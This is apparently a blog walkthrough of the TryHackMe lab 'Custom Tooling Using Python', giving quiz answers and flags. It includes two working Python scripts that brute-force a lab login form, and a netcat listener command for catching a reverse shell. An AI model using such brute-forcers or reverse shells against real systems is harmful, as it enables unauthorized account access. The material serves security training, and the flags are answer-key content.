---
title: "[THM] Custom Tooling Using Python"
description: This is a full walkthrough with answers and explanations for the TryHackMe room "Custom Tooling Using Python".
author: hubert_k
date: 2025-04-24 15:00:00 +0800
categories: [THM]
tags: [Security, THM, Walkthrough]
pin: true
math: true
mermaid: true
image:
    path: https://tryhackme-images.s3.amazonaws.com/room-icons/62a7685ca6e7ce005d3f3afe-1743656880330
---

> Link to the room: <https://tryhackme.com/room/customtoolingpython>.
{: .prompt-info }

> Remember to start the VM and the Attack Box. Run the command: `echo "VM_IP python.thm" >> /etc/hosts` in the terminal before you start working on the next tasks.
{: .prompt-warning }

## [Task 2] Using a Coding Language for Custom Tooling

#### Does a scripting language perform better than a compiled language? (Yea/Nay)
```text
Nay
```
{: .nolineno }
{: file="Answer:" }

> Scripting languages are generally slower as interpretation only happens at runtime.
{: .prompt-tip }

#### Which compiled language is easy to cross-compile?
```text
Go
```
{: .nolineno }
{: file="Answer:" }

> An advantage of `Go` is : Fast executing and easy cross-compilation.
{: .prompt-tip }

#### Which scripting language is best suited for web-based exploits?
```text
JavaScript
```
{: .nolineno }
{: file="Answer:" }

> `JavaScript` is useful for web-based exploits and widely supported in web applications.
{: .prompt-tip }

---

## [Task 3] Developing a Brute-Forcing Tool

#### What is one of the renowned Python libraries used to send HTTP requests, interact with web applications, and analyse responses?
```text
requests
```
{: .nolineno }
{: file="Answer:" }

> <https://pypi.org/project/requests/>
{: .prompt-tip }

#### What is the flag value after logging in as admin?
```text
THM{Brute_Force_Success007}
```
{: .nolineno }
{: file="Answer:" }

> Create and execute this script on your Attack Box:
{: .prompt-tip }

{% raw %}
```python
import requests

url = "http://python.thm/labs/lab1/index.php"

username = "admin"

# Generating 4-digit numeric passwords (0000-9999)
password_list = [str(i).zfill(4) for i in range(10000)]

def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        
        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")

brute_force()
```
{% endraw %}


#### Can you attempt to log in as Mark, whose password follows a specific pattern? His password consists of the first three characters as digits (000-999) followed by a single uppercase letter (A-Z). What is the flag value?
```text
THM{Brute_Force_Success_Mark001}
```
{: .nolineno }
{: file="Answer:" }

> My script for this task:
{: .prompt-tip }

{% raw %}
```python
import requests
import string

url = "http://python.thm/labs/lab1/index.php"

username = "Mark"

lowercase_alphabet = string.ascii_lowercase

# Generating 3-digit numeric passwords followed by a single uppercase letter (000A-999Z)
password_list = [str(i).zfill(3) + l for i in range(1000) for l in string.ascii_uppercase]

def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        
        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")

brute_force()
```
{% endraw %}

---

## [Task 4] Developing a Vulnerability Scanner

#### How many vulnerabilities will be identified if we use the above scanner.py script with the updated URL <http://python.thm/labs/lab2/departments.php?name=?> (without changing the original code)
```text
0
```
{: .nolineno }
{: file="Answer:" }

> Change the URL in the scanner.py script and run it.
{: .prompt-tip }

#### After tweaking the above script to use the appropriate GET parameter, how many payloads are found? (with changing the original code)
```text
2
```
{: .nolineno }
{: file="Answer:" }

> Change line 18 to `response = requests.get(url, params={"name": payload})`.
{: .prompt-tip }

#### Which of the following is the valid type of vulnerability? Write the correct option only:
`A)` CSRF
`B)` SQL injection
`C)` Prototype Pollution
`D)` XSS

```text
B
```
{: .nolineno }
{: file="Answer:" }

> Result of the script: `Potential SQL injection detected with payload...`
{: .prompt-tip }

#### What is the name of the renowned library that is used to make concurrent requests to an endpoint?
```text
Threading
```
{: .nolineno }
{: file="Answer:" }

>  Running scans sequentially is slow, so we use multi-threading to send multiple requests simultaneously, making our scanner faster and more efficient. For this we can use the `threading` library.
{: .prompt-tip }

---

## [Task 5] Creating a Basic Exploit

#### What is the flag value?
```text
THM{basic_exploit_using_python}
```
{: .nolineno }
{: file="Answer:" }

> `1.` nc -lvnp 4444 `2.` Modify the last script and change the IP to the Attack Box. `3.` Find the file with the flag.
{: .prompt-tip }

---

## [Task 6] 

#### What is the flag?
```text
THM{6470e394cbf6dab6a91682cc8585059b}
```
{: .nolineno }
{: file="Answer:" }

> Modify the last script to use your Attack Box IP, and remember to have open a listener.
{: .prompt-tip }